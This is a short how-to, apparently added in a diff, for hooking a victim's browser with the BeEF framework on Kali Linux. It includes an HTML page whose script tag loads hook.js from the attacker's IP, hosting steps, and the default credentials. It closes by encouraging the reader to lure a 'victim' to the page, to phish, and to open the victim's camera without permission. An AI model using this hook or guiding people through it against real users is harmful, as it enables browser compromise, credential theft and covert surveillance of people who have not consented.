@@ -1,0 +1,38 @@
+Beef is a framework for browser exploitation.After this exploit you will be able to collect the data and much more.
+
+open terminal and type as.
+
+service start apache2
+
+This starts a server which is inbuilt in kali linux here you are going to put your html file.
+
+open a text editor type as
+
+<!DOCTYPE html>
+<html>
+<body>
+<script src=http://<your ip>:3000/hook.js></script>
+<h1>Hi there</h1>
+//here type some basic html
+</body>
+</html>
+
+And save it as index.html
+
+To find your ip
+open a terminal and type
+ifconfig
+
+You will find a number which will be like 192.somenumber.somenumber.somenumber
+Now locate /var/www
+inside that copy paste the index.html
+
+Now click on beef icon.It will ask you for password and username .Type beef for both password and username.
+
+Connect the victim's device to the same network as yours(local network)
+Now ask your victim to visit 192.somenumber.somenumber.somenumber (your ip)
+Voila your victim's browser is compromised.
+
+Once the victim visits the ip the victim will see some basic html file.Remember you wrote index.html
+But you hooked a java script to do the backend process.
+with this you can perform phishing as well.Even access the victim's camera withou his or her permission.
